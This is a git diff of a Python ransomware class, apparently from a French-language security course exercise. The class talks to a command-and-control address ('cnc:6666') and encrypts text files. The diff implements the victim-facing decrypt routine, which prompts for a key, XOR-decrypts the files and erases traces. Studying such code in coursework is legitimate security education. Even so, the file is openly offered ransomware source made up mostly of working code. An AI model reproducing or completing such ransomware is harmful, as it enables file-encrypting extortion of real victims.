@@ -4,6 +4,7 @@ import re
 import sys
 from pathlib import Path
 from secret_manager import SecretManager
+import os
 
 
 CNC_ADDRESS = "cnc:6666"
@@ -61,7 +62,7 @@ class Ransomware:
         secret_manager = SecretManager()
         secret_manager.setup()
         
-        # On encrypte les fichiers
+        # On chiffre les fichiers
         encrypted_files = []
         for file in txt_files:
             with open(file, 'rb') as f:
@@ -77,7 +78,32 @@ class Ransomware:
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret = SecretManager()
+        try:
+            secret.load()
+            encrypted_files = self.load_encrypted_files()
+        except Exception as e:
+            print(f"Error: {e}")
+            return
+        
+        while True:
+            #On demande à la victime de rentrer sa clé
+            candidate_key = input("Enter the decryption key: ")
+            try:
+                # On teste la clé. Si on a une ValueError (ie ce n'est pas la bonne clé), on lève l'exception et on retourne au while (et on recommence...)
+                secret.set_key(candidate_key)
+                # On déchiffre les fichiers
+                secret.xorfiles(encrypted_files)
+                # On efface les traces (fichiers avec le sel, le jeton etc.)
+                secret.clean()
+                print("Decryption successful!")
+                return
+            except ValueError:
+                print("Invalid key, please try again.")
+            except Exception as e:
+                print(f"Error: {e}")
+                return
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
